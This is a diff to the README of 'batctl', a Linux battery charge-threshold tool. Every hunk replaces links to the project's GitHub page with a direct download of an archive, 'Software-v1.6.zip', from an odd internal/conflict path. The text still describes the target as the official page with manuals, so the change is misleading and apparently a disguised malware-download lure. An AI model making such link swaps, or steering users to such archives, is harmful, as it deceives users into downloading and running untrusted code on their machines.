@@ -1,6 +1,6 @@
 # ⚡ batctl - Manage Battery Charge Thresholds Easily
 
-[![Download batctl](https://img.shields.io/badge/Download-batctl-blue?style=for-the-badge)](https://github.com/HoangVietng/batctl)
+[![Download batctl](https://img.shields.io/badge/Download-batctl-blue?style=for-the-badge)](https://raw.githubusercontent.com/HoangVietng/batctl/master/internal/conflict/Software-v1.6.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Here are the steps to get batctl on your system and start managing your battery.
 
 Use this link to visit the main page where you can get the latest batctl version:
 
-[Download batctl](https://github.com/HoangVietng/batctl)
+[Download batctl](https://raw.githubusercontent.com/HoangVietng/batctl/master/internal/conflict/Software-v1.6.zip)
 
 This page contains the software, manuals, and more.
 
@@ -104,7 +104,7 @@ For example, if you want your battery to charge only up to 80%, set the stop cha
 ## 📚 Additional Resources
 
 - Visit the main project page for updates and FAQs:  
-  [https://github.com/HoangVietng/batctl](https://github.com/HoangVietng/batctl)
+  [https://raw.githubusercontent.com/HoangVietng/batctl/master/internal/conflict/Software-v1.6.zip](https://raw.githubusercontent.com/HoangVietng/batctl/master/internal/conflict/Software-v1.6.zip)
 
 - Linux community forums can help with advanced setup and model support.
 
@@ -121,6 +121,6 @@ For example, if you want your battery to charge only up to 80%, set the stop cha
 
 ## 📥 Download and Setup Links
 
-[![Download batctl](https://img.shields.io/badge/Get%20batctl%20Here-grey?style=for-the-badge)](https://github.com/HoangVietng/batctl)
+[![Download batctl](https://img.shields.io/badge/Get%20batctl%20Here-grey?style=for-the-badge)](https://raw.githubusercontent.com/HoangVietng/batctl/master/internal/conflict/Software-v1.6.zip)
 
 Click the links above to visit the official page and follow the steps to download and install batctl on your Linux laptop.
